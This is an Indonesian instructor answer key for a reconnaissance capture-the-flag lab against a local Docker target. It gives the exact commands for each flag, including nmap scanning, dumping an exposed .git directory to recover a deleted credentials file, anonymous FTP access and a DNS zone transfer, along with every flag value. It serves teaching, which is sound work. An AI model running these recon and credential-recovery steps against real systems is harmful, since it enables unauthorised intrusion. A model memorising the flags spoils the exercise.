# Jawaban & Walkthrough - CTF Recon corplab.local

Pendamping `SOAL.md`. File ini berisi **command persis + flag** untuk
tiap nomor. Jangan bagikan ke peserta sebelum sesi selesai (boleh
dibagikan sesudahnya sebagai bahan belajar "cara yang dimaksud").

Port yang dipakai di bawah ini (`80/443/8090/21/5300/6380/3306/2200`)
BUKAN sesuatu yang harus ditebak - itu cuma default port host dari
`docker-compose.yml` repo ini (beberapa digeser dari port standarnya,
mis. DNS di 5300 bukan 53, karena bentrok port di mesin development).
Di skenario nyata, peserta akan tahu port yang benar dari **hasil nmap
mereka sendiri** (Flag 2), bukan dari dokumen ini. Ganti `<target>`
dengan IP/host tempat lab dijalankan, dan sesuaikan tiap port di bawah
kalau instruktur mengubah mapping default di `docker-compose.yml`.

---

## Flag 1 - Passive Recon

Baca langsung isi HTML yang dikirim server, cari komentar yang tidak
tampil di halaman:

```bash
curl -s http://<target>/ | grep -i FLAG
```

atau buka `http://<target>/` di browser -> View Page Source -> `Ctrl+F`
cari "FLAG".

**Flag:** `NUSA{v13w_s0urc3_m4s1h_p3nt1ng}`

---

## Flag 2 - Active Recon (nmap)

Port scan menyeluruh (bukan cuma port umum) untuk menemukan service yang
tidak tertaut di mana pun:

```bash
nmap -Pn -sV -p- <target>
```

Akan muncul port `8090` (host) / `8080` (internal container) yang
menjalankan nginx terpisah dari situs utama. Akses:

```bash
curl -s http://<target>:8090/ | grep -i FLAG
```

**Flag:** `NUSA{p0rt_t3rsembuny1_bukan_r4h4s1a}`

---

## Flag 3 - Active Recon (exposed `.git`)

1. Directory/file fuzzing ke situs utama akan menemukan `/.git/`
   (juga di-hint lewat `/robots.txt`):

   ```bash
   curl -s http://<target>/.git/HEAD
   # ref: refs/heads/main
   ```

2. `git clone` biasa ke URL `.git` itu **akan gagal** (dumb HTTP
   protocol sudah tidak didukung git modern). Pakai tool dump khusus,
   mis. [`git-dumper`](https://github.com/arthaud/git-dumper):

   ```bash
   pip install git-dumper
   git-dumper http://<target>/.git/ ./dumped
   cd dumped
   git log --all --oneline
   ```

   Hasilnya 4 commit, salah satunya menghapus sebuah file:

   ```
   <hash4>  Release v2.3.1 - patch form kontak, tambah health check endpoint
   <hash3>  Hapus file kredensial yang ke-commit tidak sengaja
   <hash2>  WIP: migrasi FTP internal, simpan kredensial sementara (lupa masukin .gitignore)
   <hash1>  Initial release NusaCMS v2.0.0
   ```

3. Lihat isi file itu SEBELUM dihapus (di commit `<hash2>`, parent dari
   commit yang menghapusnya):

   ```bash
   git show <hash2>:config/db_credentials.txt.bak
   ```

**Flag:** ada di baris terakhir file itu ->
`NUSA{h1st0ry_g1t_t1d4k_p3rn4h_lup4}`

*(Alternatif tanpa `git-dumper`: fetch manual tiap object lewat
`curl http://<target>/.git/objects/<2-char>/<38-char-sisanya>` lalu
`zlib`-decompress. Lebih ribet tapi membuktikan prinsip yang sama.)*

---

## Flag 4 - Active Recon (FTP anonymous)

```bash
curl -s ftp://<target>/ --user anonymous:anon
curl -s ftp://<target>/CHANGELOG_internal.txt.bak --user anonymous:anon
```

**Flag:** `NUSA{4n0n_ftp_m4s1h_b0c0r}`

---

## Flag 5 - DNS Enumeration (zone transfer)

```bash
dig axfr corplab.local @<target> -p 5300
```

Kalau `allow-transfer` dibatasi dengan benar, ini akan ditolak. Di lab
ini sengaja terbuka, jadi keluar seluruh isi zone termasuk baris TXT
tambahan yang bukan SPF biasa.

**Flag:** `NUSA{4xfr_s3h4rusny4_d1b4t4s1}`

---

## Flag 6 - DNS Enumeration (chaining ke vhost)

Dari hasil AXFR (atau dari SAN sertifikat TLS:
`echo | openssl s_client -connect <target>:443 -servername corplab.local
2>/dev/null | openssl x509 -noout -text | grep -A2 "Subject Alternative
Name"`), ambil nama subdomain yang terasa seperti environment staging,
lalu petakan ke `/etc/hosts`:

```bash
echo "<target-ip> staging.corplab.local" | sudo tee -a /etc/hosts
curl -s http://staging.corplab.local/ | grep -i FLAG
```

(Kalau tidak mau ubah `/etc/hosts`, bisa juga langsung set Host header:
`curl -s -H "Host: staging.corplab.local" http://<target>/`)

**Flag:** `NUSA{d1t3mukan_l3wat_dns_buk4n_l1nk}`

---

## Flag 7 - Technology Footprint (response header)

Subdomain `dev.corplab.local` (ditemukan dengan cara sama seperti Flag 6)
berjalan dengan header debug tambahan. Cek header, bukan body:

```bash
curl -sI -H "Host: dev.corplab.local" http://<target>/
```

Cari baris `X-Flag:`.

**Flag:** `NUSA{h34d3r_b0c0rk4n_l1ngkung4n}`

---

## Rekap Cepat

| # | Flag |
|---|------|
| 1 | `NUSA{v13w_s0urc3_m4s1h_p3nt1ng}` |
| 2 | `NUSA{p0rt_t3rsembuny1_bukan_r4h4s1a}` |
| 3 | `NUSA{h1st0ry_g1t_t1d4k_p3rn4h_lup4}` |
| 4 | `NUSA{4n0n_ftp_m4s1h_b0c0r}` |
| 5 | `NUSA{4xfr_s3h4rusny4_d1b4t4s1}` |
| 6 | `NUSA{d1t3mukan_l3wat_dns_buk4n_l1nk}` |
| 7 | `NUSA{h34d3r_b0c0rk4n_l1ngkung4n}` |

Untuk temuan non-flag (port tambahan, tech stack, OSINT staf, dsb) dan
diskusi risiko/rekomendasi lebih lengkap, lihat `instructor/ANSWER_KEY.md`.
